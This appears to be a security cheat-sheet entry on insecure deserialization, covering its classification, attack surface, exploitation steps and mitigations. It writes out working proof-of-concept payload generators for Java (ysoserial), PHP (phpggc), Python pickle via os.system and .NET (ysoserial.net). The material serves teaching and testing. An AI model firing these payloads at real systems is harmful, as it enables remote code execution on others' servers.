Critical Severity

📌 Insecure Deserialization

🧠 Description

Insecure deserialization occurs when untrusted data is used to reconstruct an object, leading to remote code execution, replay attacks, or privilege escalation.

🏷️ Classification

  • Type: Deserialization
  • OWASP: A08:2021 – Software and Data Integrity Failures
  • CWE: CWE-502: Deserialization of Untrusted Data

🎯 Attack Surface

  • ✅ Cookies (e.g., Java serialized objects)
  • ✅ API endpoints accepting JSON/XML with type hints
  • ✅ Hidden form fields using serialized objects
  • ✅ Session storage (e.g., PHP sessions)

💣 Basic Payloads

# Java (ysoserial)
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' | base64

# PHP (phpggc)
phpggc Monolog/RCE1 system 'id' --json

# Python pickle
import pickle, os, base64
class Evil:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Evil())))

# .NET (ysoserial.net)
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc.exe"

⚙️ Exploitation Steps

  1. Identify serialised data (base64, binary, JSON with @type).
  2. Decode and analyse the object structure.
  3. Use gadget chains (ysoserial, phpggc) to generate malicious payload.
  4. Replace original serialised data with payload.
  5. Trigger deserialisation (send request, click link).

🛡️ Mitigation

✅ Never deserialize untrusted data
✅ Use allowlist of safe classes (Java: LookAheadDeserializer)
✅ Prefer JSON/XML without type information
✅ Implement integrity checks (HMAC) on serialised objects
✅ Keep libraries updated to block known gadget chains
